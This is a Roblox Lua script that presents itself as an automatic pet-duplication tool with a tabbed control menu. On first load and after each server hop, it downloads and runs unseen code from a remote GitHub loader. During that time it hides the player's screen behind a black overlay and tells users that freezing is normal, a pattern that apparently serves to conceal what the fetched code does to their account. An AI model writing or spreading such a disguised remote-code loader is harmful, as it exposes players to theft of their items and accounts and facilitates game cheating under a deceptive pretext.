local player = game:GetService("Players").LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "AutoDupingSystem"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Store the current black screen reference
local currentBlackScreen = nil

-- Function to create black screen with text
local function showBlackScreen(message)
    -- Remove previous black screen if exists
    if currentBlackScreen then
        currentBlackScreen:Destroy()
    end
    
    local blackScreen = Instance.new("ScreenGui")
    blackScreen.Name = "ExecutionScreen"
    blackScreen.IgnoreGuiInset = true
    blackScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    blackScreen.Parent = player:WaitForChild("PlayerGui")
    
    -- Full black background
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.Position = UDim2.new(0, 0, 0, 0)
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    bg.BackgroundTransparency = 0
    bg.Parent = blackScreen
    
    -- Main text
    local text = Instance.new("TextLabel")
    text.Size = UDim2.new(0.9, 0, 0, 100)
    text.Position = UDim2.new(0.05, 0, 0.4, -50)
    text.BackgroundTransparency = 1
    text.Text = message
    text.TextColor3 = Color3.new(1, 1, 1)
    text.Font = Enum.Font.SourceSansBold
    text.TextSize = 28
    text.TextWrapped = true
    text.TextXAlignment = Enum.TextXAlignment.Center
    text.TextYAlignment = Enum.TextYAlignment.Center
    text.Parent = blackScreen
    
    -- Loading dots animation
    local dots = {".", "..", "...", "...."}
    coroutine.wrap(function()
        while blackScreen and blackScreen.Parent do
            for i = 1, #dots do
                if not blackScreen or not blackScreen.Parent then break end
                text.Text = message..dots[i]
                task.wait(0.5)
            end
        end
    end)()
    
    currentBlackScreen = blackScreen
    return blackScreen
end

-- Main execution function
local function executeDupingScript(manualExecute)
    local blackScreen = showBlackScreen("EXECUTING DUPING PROCESS")
    
    task.delay(0.5, function()
        -- Execute the script
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua", true))()
        end)
        
        -- Only remove screen after full execution time if not manual execute
        if not manualExecute then
            task.delay(15, function()
                if blackScreen and blackScreen.Parent then
                    blackScreen:Destroy()
                end
                
                if not success then
                    warn("Duping script failed to load:", err)
                end
            end)
        end
    end)
end

-- Create main window with tabs
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "Auto Duping System",
   LoadingTitle = "Duping Interface",
   LoadingSubtitle = "by 7xxx",
   ConfigurationSaving = {
      Enabled = false,
   },
   Discord = {
      Enabled = false,
   },
})

-- Create main tab
local MainTab = Window:CreateTab("Main Controls", 4483362458)

-- Create tutorial tab
local TutorialTab = Window:CreateTab("How To Use", 4483362458)

-- Tutorial section
local TutorialSection = TutorialTab:CreateSection("Step-by-Step Guide")

TutorialTab:CreateLabel("1. Enable Auto-Execute in the Main Controls tab")
TutorialTab:CreateLabel("2. Make sure you have pets in your inventory to dupe")
TutorialTab:CreateLabel("3. Click 'Execute Now' or wait for auto-execution")
TutorialTab:CreateLabel("4. Be patient - freezing is normal during the process")
TutorialTab:CreateLabel("5. The black screen will remain until process completes")
TutorialTab:CreateLabel("6. It will auto hop just execute the script again after")

local WarningSection = TutorialTab:CreateSection("Important Notes")
TutorialTab:CreateLabel("• Don't close the game during execution")
TutorialTab:CreateLabel("• Server hopping must be enabled")
TutorialTab:CreateLabel("• Process takes about 15 seconds to complete")
TutorialTab:CreateLabel("• Black screen stays visible during manual execution")

-- Main controls section
local ControlSection = MainTab:CreateSection("Execution Controls")

local statusLabel = MainTab:CreateLabel("Status: READY")

local autoExecuteEnabled = true
local lastPlaceId = game.PlaceId
local lastServerId = game.JobId

local toggleButton = MainTab:CreateButton({
    Name = "Disable Auto-Execute",
    Callback = function()
        if autoExecuteEnabled then
            autoExecuteEnabled = false
            toggleButton:Set("Enable Auto-Execute")
            statusLabel:Set("Status: DISABLED")
        else
            autoExecuteEnabled = true
            toggleButton:Set("Disable Auto-Execute")
            statusLabel:Set("Status: ACTIVE (WAITING)")
            lastPlaceId = game.PlaceId
            lastServerId = game.JobId
        end
    end,
})

local executeButton = MainTab:CreateButton({
    Name = "Execute Now",
    Callback = function()
        statusLabel:Set("Status: MANUAL EXECUTION")
        executeDupingScript(true) -- Pass true to indicate manual execution
        task.wait(16)
        if autoExecuteEnabled then
            statusLabel:Set("Status: ACTIVE (WAITING)")
        else
            statusLabel:Set("Status: READY")
        end
    end,
})

-- Immediately execute on first load
statusLabel:Set("Status: INITIAL EXECUTION")
executeDupingScript(false)
task.wait(16)
statusLabel:Set("Status: ACTIVE (WAITING)")

-- Server hop detection loop
coroutine.wrap(function()
    while true do
        if autoExecuteEnabled then
            if game.PlaceId ~= lastPlaceId or game.JobId ~= lastServerId then
                statusLabel:Set("STATUS: EXECUTING")
                
                lastPlaceId = game.PlaceId
                lastServerId = game.JobId
                
                executeDupingScript(false)
                
                task.wait(16)
                
                if autoExecuteEnabled then
                    statusLabel:Set("STATUS: ACTIVE (WAITING)")
                end
            end
        end
        task.wait(1)
    end
end)()

Rayfield:LoadConfiguration()
